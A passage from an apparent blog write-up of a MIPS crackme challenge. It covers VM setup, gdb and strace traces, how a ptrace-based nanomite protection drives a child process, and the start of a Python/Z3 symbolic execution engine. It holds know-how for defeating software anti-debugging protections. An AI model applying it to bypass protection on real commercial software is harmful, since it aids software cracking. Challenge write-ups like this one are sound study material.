</span><span class='line'>overclok@wildout:~/chall/nsc2014<span class="nv">$ </span>./start_vm.sh
</span><span class='line'><span class="o">[</span>    0.000000<span class="o">]</span> Initializing cgroup subsys cpuset
</span><span class='line'><span class="o">[</span>    0.000000<span class="o">]</span> Initializing cgroup subsys cpu
</span><span class='line'><span class="o">[</span>    0.000000<span class="o">]</span> Linux version 3.2.0-4-4kc-malta <span class="o">(</span>debian-kernel@lists.debian.org<span class="o">)</span> <span class="o">(</span>gcc version 4.6.3 <span class="o">(</span>Debian 4.6.3-14<span class="o">)</span> <span class="o">)</span> <span class="c">#1 Debian 3.2.51-1</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>debian-mipsel login: root
</span><span class='line'>Password:
</span><span class='line'>Last login: Sat Oct 11 00:04:51 UTC 2014 on ttyS0
</span><span class='line'>Linux debian-mipsel 3.2.0-4-4kc-malta <span class="c">#1 Debian 3.2.51-1 mips</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>root@debian-mipsel:~# uname -a
</span><span class='line'>Linux debian-mipsel 3.2.0-4-4kc-malta <span class="c">#1 Debian 3.2.51-1 mips GNU/Linux</span>
</span></code></pre></td></tr></table></div></figure>


<p>Feel free to install your essentials in the virtual environment, some tools might come handy (it should take a bit of time to install them though):</p>

<figure class='code'><figcaption><span>aptitude install all-of-the-things</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@debian-mipsel:~# aptitude install strace gdb gcc python
</span><span class='line'>root@debian-mipsel:~# wget https://raw.githubusercontent.com/zcutlip/gdbinit-mips/master/gdbinit-mips
</span><span class='line'>root@debian-mipsel:~# mv gdbinit-mips ~/.gdbinit
</span><span class='line'>root@debian-mipsel:~# gdb -q /home/user/crackmips
</span><span class='line'>Reading symbols from /home/user/crackmips...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main
</span><span class='line'>Breakpoint 1 at 0x402024
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="s1">&#39;doar-e ftw&#39;</span>
</span><span class='line'>Starting program: /home/user/crackmips <span class="s1">&#39;doar-e ftw&#39;</span>
</span><span class='line'>-----------------------------------------------------------------
</span><span class='line'><span class="o">[</span>registers<span class="o">]</span>
</span><span class='line'>  V0: 7FFF6D30  V1: 77FEE000  A0: 00000002  A1: 7FFF6DF4
</span><span class='line'>  A2: 7FFF6E00  A3: 0000006C  T0: 77F611E4  T1: 0FFFFFFE
</span><span class='line'>  T2: 0000000A  T3: 77FF6ED0  T4: 77FE5590  T5: FFFFFFFF
</span><span class='line'>  T6: F0000000  T7: 7FFF6BE8  S0: 00000000  S1: 00000000
</span><span class='line'>  S2: 00000000  S3: 00000000  S4: 004FD268  S5: 004FD148
</span><span class='line'>  S6: 004D0000  S7: 00000063  T8: 77FD7A5C  T9: 00402024
</span><span class='line'>  GP: 77F67970  S8: 0000006C  HI: 000001A5  LO: 00005E17
</span><span class='line'>  SP: 7FFF6D18  PC: 00402024  RA: 77DF2208
</span><span class='line'>-----------------------------------------------------------------
</span><span class='line'><span class="o">[</span>code<span class="o">]</span>
</span><span class='line'><span class="o">=</span>&gt; 0x402024 &lt;main&gt;:     addiu   sp,sp,-72
</span><span class='line'>   0x402028 &lt;main+4&gt;:   sw      ra,68<span class="o">(</span>sp<span class="o">)</span>
</span><span class='line'>   0x40202c &lt;main+8&gt;:   sw      s8,64<span class="o">(</span>sp<span class="o">)</span>
</span><span class='line'>   0x402030 &lt;main+12&gt;:  move    s8,sp
</span><span class='line'>   0x402034 &lt;main+16&gt;:  sw      a0,72<span class="o">(</span>s8<span class="o">)</span>
</span><span class='line'>   0x402038 &lt;main+20&gt;:  sw      a1,76<span class="o">(</span>s8<span class="o">)</span>
</span><span class='line'>   0x40203c &lt;main+24&gt;:  lw      v1,72<span class="o">(</span>s8<span class="o">)</span>
</span><span class='line'>   0x402040 &lt;main+28&gt;:  li      v0,2
</span></code></pre></td></tr></table></div></figure>


<p>And finally you should be able to run the wild beast:</p>

<figure class='code'><figcaption><span>release the beast</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@debian-mipsel:~# /home/user/crackmips
</span><span class='line'>usage: /home/user/crackmips password
</span><span class='line'>root@debian-mipsel:~# /home/user/crackmips <span class="s1">&#39;doar-e ftw&#39;</span>
</span><span class='line'>WRONG PASSWORD
</span></code></pre></td></tr></table></div></figure>


<p>Brilliant :&ndash;).</p>

<h2>The big picture</h2>

<p>Now that we have a way of both launching and debugging the challenge, we can open the binary in IDA and start to understand what type of protection scheme is used. As always at that point, we are really not interested in details: we just want to understand how
it works and what parts we will have to target to get the <em>good boy</em> message.</p>

<p>After a bit of time in IDA, here is how works the binary:</p>

<ol>
<li> It checks that the user supplied one argument: the serial</li>
<li> It checks that the supplied serial is 48 characters long</li>
<li> It converts the string into 6 <em>DWORD</em>s (/!\ pitfall warning: the conversion is a bit strange, be sure to verify your algorithm)</li>
<li> The beast forks in two:

<ol>
<li>[Father] It seems, somehow, this one is <em>driving</em> the son, more on that later</li>
<li>[Son] After executing a big chunk of code that modifies (in place) the 6 original <em>DWORD</em>s, they get compared against the following string <em>[ Synacktiv + NSC = &lt;3 ]</em></li>
<li>[Son] If the comparison succeeds you win, else you loose</li>
</ol>
</li>
</ol>


<p>Basically, we need to find the 6 input <em>DWORD</em>s that are going to generate the following ones in <em>output</em>: <em>0x7953205b</em>, <em>0x6b63616e</em>, <em>0x20766974</em>, <em>0x534e202b</em>, <em>0x203d2043</em>, <em>0x5d20333c</em>. We also know that the father is going to interact with its son, so we need to study both codes to be sure to understand the challenge properly.
If you prefer code, here is the big picture in C:</p>

<figure class='code'><figcaption><span>big picture</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">DWORD</span> <span class="n">serial_dwords</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>        <span class="n">Usage</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Conversion</span>
</span><span class='line'>    <span class="n">a2i</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">serial_dwords</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="c1">// Father</span>
</span><span class='line'>        <span class="c1">// a lot of stuff going on here, we will see that later on</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="c1">// Son</span>
</span><span class='line'>        <span class="c1">// a lot of stuff going on here, we will see that later on</span>
</span><span class='line'>
</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">clear</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">serial_dwords</span><span class="p">;</span>
</span><span class='line'>        <span class="n">bool</span> <span class="n">win</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">clear</span><span class="p">,</span> <span class="s">&quot;[ Synacktiv + NSC = &lt;3 ]&quot;</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>
</span><span class='line'>            <span class="n">GoodBoy</span><span class="p">();</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="n">BadBoy</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h1>Let&rsquo;s get our hands dirty</h1>

<h2>Father&rsquo;s in charge</h2>

<p>The first thing I did after having the big picture was to look at the code of the father. Why? The code seemed a bit simpler than the son&rsquo;s one, so I figured studying the father would make more sense to understand what kind of protection we need to subvert.
You can even crank up <a href="http://linux.die.net/man/1/strace">strace</a> to have a clearer overview of the syscalls used:</p>

<figure class='code'><figcaption><span>strace father</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>root@debian-mipsel:~# strace -i /home/user/crackmips $(python -c &#39;print &quot;1&quot;*48&#39;)
</span><span class='line'>[7734e224] execve(&quot;/home/user/crackmips&quot;, [&quot;/home/user/crackmips&quot;, &quot;11111111111111111111111111111111&quot;...], [/* 12 vars */]) = 0
</span><span class='line'>[...]
</span><span class='line'>[77335e70] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77491068) = 2539
</span><span class='line'>[77335e70] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7733557c] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
</span><span class='line'>[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
</span><span class='line'>[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
</span><span class='line'>[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s an interesting output that I didn&rsquo;t expect at all actually. What we are seeing here is the father driving its son by modifying, potentially (we will find out that later), its context every time the son is <em>SIGTRAP</em>ing (note <em>waitpid</em> second argument).</p>

<p>From here, if you are quite familiar with the different existing type of software protections (I&rsquo;m not saying I am an expert in this field but I just happened to know that one :-P) you can pretty much guess what that is: nanomites this is!</p>

<h3>Nanomites 101</h3>

<p>Namomites are quite a nice protection. Though, it is quite a generic name ; you can really use that protection scheme in whatever way you like: your imagination is the only limit here. To be honest, this was the first time I saw this kind of protection implemented on a Unix system ; really good surprise!
It usually works this way:</p>

<ol>
<li> You have two processes: a driver and a driven ; a father and a son</li>
<li> The driver is attaching itself to the driven one with the debug APIs available on the targeted platform (<em>ptrace</em> here, and <em>CreateProcess</em>/<em>DebugActiveProcess</em> on Windows)

<ol>
<li>Note that, by design you won&rsquo;t be able to attach yourself to the son as both Windows and Linux prevent that (by design): some people call that part the <em>DebugBlocker</em></li>
<li>You will able to debug the driver though</li>
</ol>
</li>
<li>  Usually the interesting code is in the son, but again you can do whatever you want. Basically, you have two rules if you want an efficient protection:

<ol>
<li>Make sure the driven process can&rsquo;t run without its driver and that they are really tied to each other</li>
<li> The strength of the protection is that strong/intimate bound between the two processes</li>
<li>Design your algorithm such that <em>removing</em> the driver is really difficult/painful/driving mad the attacker</li>
</ol>
</li>
<li> The driven process can <em>call</em>/<em>notify</em> the driver by just <em>SIGTRAP</em>ing with an <em>int3</em>/<em>break</em> instruction for example</li>
</ol>


<p>As I said, I see this protection scheme more like a <em>recipe</em>: you are free to customize it at your convenience really. If you want to read more on the subject, here is a list of links you should check out:</p>

<ul>
<li><a href="http://www.codeproject.com/Articles/621236/Nanomite-and-Debug-Blocker-for-Linux-Applications">Nanomite and Debug Blocker for Linux Applications</a>: It gives a good overview of how you can get such a protection scheme to work on Linux,</li>
<li><a href="http://blog.w4kfu.com/post/Unpackme_I_am_Famous">Unpackme I am Famous</a>: This shows you what nanomites look like on Windows in a real protected product ; done by my mate <a href="https://twitter.com/w4kfu">@w4kfu</a>,</li>
<li><a href="http://w3challs.com/challenges/cracking">Debug me</a>: Another sweet challenge that uses nanomites on Windows</li>
</ul>


<h3><a id="static_analysis_father"></a> How the father works</h3>

<p>Now it is time to took into details the father ; here is how it works:</p>

<ul>
<li>The first thing it does is to <em>waitpid</em> until its son triggers a <em>SIGTRAP</em></li>
<li>The driver retrieves the CPU context of the son process and more precisely its <em>program counter</em>: <em>$pc</em></li>
<li>Then we have a huge block of arithmetic computations. But after spending a bit of time to study it, we can see that huge block as a black-box function that takes two parameters: the program counter of the son and some kind of counter value (as this code is going to be executed in a loop, for each <em>SIGTRAP</em> this variable is going to be incremented). It generates a single output which is a 32 bits value that I call the <em>first magic value</em>.
Let&rsquo;s not focus on what the block is actually doing though, we will develop some tool in the next part to deal with that :&ndash;) so let&rsquo;s keep moving!</li>
</ul>


<p><img class="center" src="http://doar-e.github.io/images/taming_a_wild_nanomite-protected_mips_binary_with_symbolic_execution_no_such_crackme/father_code.png"></p>

<ul>
<li>This <em>magic value</em> is then used to find a specific entry in an array of <em>QWORD</em>s (606 <em>QWORD</em>s which is 6 times the number of <em>break</em> instructions in the son &mdash; you will understand that a bit later don&rsquo;t worry). Basically, the code is going to loop over every single <em>QWORD</em> of this array until finding one that has the high <em>DWORD</em> equals to the <em>magic value</em>. From there you get another <em>magic value</em> which is the lowest <em>DWORD</em> of the matching <em>QWORD</em>.</li>
<li>Another huge block of arithmetic computations is used. Similarly to the first one, we can see it as a black-box function with two inputs: the second <em>magic value</em> and a round index (the son is executing its code 6 times, so this round index will start from 0 until 5 &mdash; again this will be a bit clearer when we look at the son, so just keep this detail in your mind). The output of this function is a 32 bits value. Again, do not study this block, we don&rsquo;t need it.</li>
<li>The generated value is in fact a valid code address inside the son ; so straight after the computation, the father is going to modify the program counter in the previously retrieved CPU context. Once this is done, it calls <em>ptrace</em> with <em>SETREGS</em> to set the new CPU context of the son.</li>
</ul>


<p>This is what roughly is going to be executed every time the son is going to hit a <em>break</em> instruction ; the father is definitely driving the son. And we can feel it now, the son is going to jump (via its father) through block of codes that aren&rsquo;t (necessary) contiguous in memory, so studying the son code as it is in IDA is quite pointless as those basic blocks aren&rsquo;t going to be executed in this order.</p>

<p>Long story short, the nanomites are used as some kind of runtime code flow scrambling primitive, isn&rsquo;t it exciting? Told you that <a href="https://twitter.com/elvanderb">@elvanderb</a> is crazy :&ndash;).</p>

<h2>Gearing up: Writing a symbolic executing engine <a id="writing_symbolic_exec"></a></h2>

<p>At that point, I can assure you that we need some tooling: we have studied the binary, we know how the main parts work and we just need to extract the different equations/formulas used by both the computation of the son&rsquo;s program counter and the serial verification algorithm. Basically the engine is going to be useful to study both the father and the son.</p>

<p>If you are not really familiar with symbolic execution, I recommend you take a little bit of time to read <a href="https://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution/">Breaking Kryptonite&rsquo;s Obfuscation: A Static Analysis Approach Relying on Symbolic Execution</a> and check out <a href="https://github.com/0vercl0k/z3-playground">z3-playground</a> if you are not really familiar with <a href="https://z3.codeplex.com/">Z3</a> and its Python bindings.</p>

<p>This time I decided to not build that engine as an IDA Python script, but just to do everything myself. Do not be afraid though, even if it sounds scary it is really not: the challenge is a perfect environment for those kind of things. It doesn&rsquo;t use a lot of instructions, we don&rsquo;t need to support branches and nearly only arithmetic instructions are used.</p>

<p>I also chose to implement this engine in a way that we can also use it as a simple emulator. You can even use it as a decompiler if you want! The two other interesting points for us are:</p>

<ol>
<li> Once we run a piece of code in the symbolic engine, we will <em>extract</em> certain computations / formulas. Thanks to Microsoft&rsquo;s <a href="https://z3.codeplex.com/">Z3</a> we will be able to retrieve input values that will generate specific output values: this is basically what you gain by using a solver and symbolic variables.</li>
<li> But the other interesting point is that you still can use the extracted <a href="https://z3.codeplex.com/">Z3</a> expressions as some kind of black-box <em>functions</em>. You know what the function is doing, kind of, but you don&rsquo;t know how ; and you are not interested in the how. You know the inputs, and the outputs. To obtain a concrete output value, you can just replace the symbolic variables by concrete values. This is really handy, especially when you are not only interested in finding input values to generate specific output values ; sometimes you just want to go both ways :&ndash;).</li>
</ol>


<p>Anyway, after this long theoretical speech let&rsquo;s have a look at some code. The first important job of the engine is to be able to parse MIPS assembly: fortunately for us this is really easy. We are directly feeding plain-text MIPS disassembly directly copied from IDA to our engine:</p>

<figure class='code'><figcaption><span>mini_mips_symexec_engine.py@MiniMipsSymExecEngine._parse_line</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_parse_line</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span><span class='line'>  <span class="n">addr_seg</span><span class="p">,</span> <span class="n">instr</span><span class="p">,</span> <span class="n">rest</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="n">args</span> <span class="o">=</span> <span class="n">rest</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)):</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;#&#39;</span> <span class="ow">in</span> <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
</span><span class='line'>        <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">_</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span>
</span><span class='line'>    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span> <span class="k">if</span> <span class="n">x</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="n">x</span><span class="p">,</span>
</span><span class='line'>    <span class="n">args</span> <span class="o">+</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="mi">3</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'>  <span class="n">_</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">addr_seg</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span> <span class="n">instr</span><span class="p">,</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span>
</span></code></pre></td></tr></table></div></figure>


<p>From here you have all the information you need: the instruction and its operands (<em>None</em> if an operand doesn&rsquo;t exist as you can have up to 3 operands). The other important job that follows is to handle the different type of operands ; here are the ones I encountered in the challenge:</p>

<ul>
<li>General purpose register,</li>
<li>Stack-variable,</li>
<li>Immediate value.</li>
</ul>


<p>To handle / convert those I created a bunch of dull / helper functions:</p>

<figure class='code'><figcaption><span>mini_mips_symexec_engine.py@MiniMipsSymExecEngine._is_*</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_is_gpr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Is it a valid GPR name?&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">x</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">_is_imm</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Is it a valid immediate?&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;loc_&#39;</span><span class="p">,</span> <span class="s">&#39;0x&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">except</span><span class="p">:</span>
</span><span class='line'>    <span class="k">return</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">_to_imm</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Get an integer from a string immediate&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_imm</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
